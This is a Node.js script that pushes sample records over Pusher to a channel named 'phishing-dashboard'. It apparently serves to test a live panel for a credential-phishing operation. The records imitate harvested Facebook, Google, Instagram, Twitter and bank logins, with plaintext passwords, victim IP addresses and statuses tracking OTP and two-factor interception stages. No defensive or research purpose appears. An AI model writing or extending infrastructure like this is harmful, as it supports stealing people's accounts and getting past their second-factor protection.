import { pusher } from './src/configs/pusher.config.js';

console.log('🚀 Pusher Data Sender Script');
console.log('📡 Sending test data to dashboard...');

// Test account data
const testAccounts = [
    {
        id: Date.now(),
        username: 'john_doe_123',
        password: 'mypassword123',
        website: 1,
        website_title: 'Facebook Login',
        ip_address: '192.168.1.100',
        status: 'success',
        created_at: new Date().toISOString()
    },
    {
        id: Date.now() + 1,
        username: 'jane.smith@gmail.com',
        password: 'googlepass456',
        website: 2,
        website_title: 'Google Sign In',
        ip_address: '192.168.1.101',
        status: 'otp-mail',
        created_at: new Date().toISOString()
    },
    {
        id: Date.now() + 2,
        username: 'insta_user_789',
        password: 'instapass789',
        website: 3,
        website_title: 'Instagram Login',
        ip_address: '192.168.1.102',
        status: 'success',
        created_at: new Date().toISOString()
    }
];

// Send test accounts
async function sendTestData() {
    try {
        for (let i = 0; i < testAccounts.length; i++) {
            const account = testAccounts[i];
            
            const data = {
                type: 'new_account',
                data: {
                    account: account,
                    timestamp: new Date().toISOString()
                }
            };

            // Send via Pusher
            await pusher.trigger('phishing-dashboard', 'new_account', data);
            
            console.log(`✅ Sent account ${i + 1}: ${account.username} (${account.website_title})`);
            
            // Wait 2 seconds between sends
            if (i < testAccounts.length - 1) {
                await new Promise(resolve => setTimeout(resolve, 2000));
            }
        }
        
        console.log('🎉 All test data sent successfully!');
        
    } catch (error) {
        console.error('❌ Error sending test data:', error);
    }
}

// Send single random account
async function sendRandomAccount() {
    try {
        const websites = [
            { id: 1, title: 'Facebook Login' },
            { id: 2, title: 'Google Sign In' },
            { id: 3, title: 'Instagram Login' },
            { id: 4, title: 'Twitter Login' },
            { id: 5, title: 'Bank Portal' }
        ];

        const statuses = ['success', 'wrong-pass', 'otp-mail', 'otp-phone', 'otp-2fa'];
        
        const randomWebsite = websites[Math.floor(Math.random() * websites.length)];
        const randomStatus = statuses[Math.floor(Math.random() * statuses.length)];

        const account = {
            id: Date.now(),
            username: 'user_' + Math.random().toString(36).substr(2, 8),
            password: 'pass_' + Math.random().toString(36).substr(2, 8),
            website: randomWebsite.id,
            website_title: randomWebsite.title,
            ip_address: `192.168.1.${Math.floor(Math.random() * 255) + 1}`,
            status: randomStatus,
            created_at: new Date().toISOString()
        };

        const data = {
            type: 'new_account',
            data: {
                account: account,
                timestamp: new Date().toISOString()
            }
        };

        await pusher.trigger('phishing-dashboard', 'new_account', data);
        console.log(`🎲 Sent random account: ${account.username} (${account.website_title}) - Status: ${account.status}`);
        
    } catch (error) {
        console.error('❌ Error sending random account:', error);
    }
}

// Send account updated event
async function sendAccountUpdated() {
    try {
        const account = {
            id: Date.now(),
            username: 'updated_user_123',
            password: 'newpassword456',
            website: 1,
            website_title: 'Facebook Login',
            ip_address: '192.168.1.200',
            status: 'success',
            created_at: new Date().toISOString()
        };

        const data = {
            type: 'account_updated',
            data: {
                account: account,
                timestamp: new Date().toISOString()
            }
        };

        await pusher.trigger('phishing-dashboard', 'account_updated', data);
        console.log(`✏️ Sent account updated: ${account.username}`);
        
    } catch (error) {
        console.error('❌ Error sending account updated:', error);
    }
}

// Send account deleted event
async function sendAccountDeleted() {
    try {
        const accountId = Date.now();
        
        const data = {
            type: 'account_deleted',
            data: {
                accountId: accountId,
                timestamp: new Date().toISOString()
            }
        };

        await pusher.trigger('phishing-dashboard', 'account_deleted', data);
        console.log(`🗑️ Sent account deleted: ID ${accountId}`);
        
    } catch (error) {
        console.error('❌ Error sending account deleted:', error);
    }
}

// Main function
async function main() {
    const action = process.argv[2] || 'test';
    
    switch (action) {
        case 'test':
            await sendTestData();
            break;
        case 'random':
            await sendRandomAccount();
            break;
        case 'update':
            await sendAccountUpdated();
            break;
        case 'delete':
            await sendAccountDeleted();
            break;
        default:
            console.log('Usage: node send-pusher-data.js [test|random|update|delete]');
            console.log('  test   - Send multiple test accounts');
            console.log('  random - Send one random account');
            console.log('  update - Send account updated event');
            console.log('  delete - Send account deleted event');
    }
    
    process.exit(0);
}

main();
